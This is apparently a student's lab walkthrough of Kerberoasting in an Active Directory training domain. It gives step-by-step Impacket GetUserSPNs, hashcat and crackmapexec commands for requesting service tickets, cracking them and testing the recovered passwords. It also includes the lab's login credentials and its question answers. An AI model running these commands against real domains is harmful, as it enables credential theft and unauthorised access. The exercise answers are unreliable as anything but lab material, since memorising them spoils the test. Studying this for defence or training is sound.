
>[!info] Kerberoasting Overview
> - Kerberoasting targets Service Principal Names
> - SPNs are used to map a service instance to a service account
> - A domain user can request a Kerberos ticket for any service account in the same domain

>[!Warning] Kerberoasting Pre-reqs
>To perform this attack you will need the following items:
> - Target accounts cleartext password or NTLM hash
> - A shell in the context of a domain user account or a SYTEM level access on a domain joined host

### Tools to Perform Kerberoasting
- Impacket's GetUsersSPNs.py
- Combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz
- PowerView, [Rubeus](https://github.com/GhostPack/Rubeus), and other PowerShell scripts


--------------------------------------
### Kerberoasting with GetUsersSPNs.py

##### Listing SPN Accounts with GetUsersSPNS.py

*This command will prompt you for a DC credential: cleartext passwd, NT hash or K ticket*
```go
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

##### Request all TGS Tickets

>[!tip]
> This allows us to pull all tickets offline and crack each ticket via hashcat or JtR
```go
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
```


OR

##### Requesting a Single TGS Ticket

>[!tip]
> Remember to output the ticket to a file for easier retrieval 
```go
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```


##### Cracking Ticket via Hashcat
```go
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```


Now test authentication

##### Testing Authenticate to DC
```go
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

------------------------------------------------------------------------

# Questions

Username
```go
htb-student
```

Password
```go
HTB_@cademy_stdnt!
```

SSH
```go
ssh htb-student@10.129.42.135
```

### Question 1: Retrieve the TGS ticket for the SAPService account. Crack the ticket offline and submit the password as your answer.
```go
!SapperFi2
```

Use forend's password and list the SPNs with GetUserSPNs
```go
proxychains GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

forend's passwd
```go
Klmcargo2
```

Now get the ticket
```go
proxychains GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sapservice -outputfile sapservice_tgs
```

Crack TGS via Hashcat
```go
hashcat -m 13100 sapservice_tgs /usr/share/wordlists/rockyou.txt
```




### Question 2: What powerful local group on the Domain Controller is the SAPService user a member of?
```go
Account Operators
```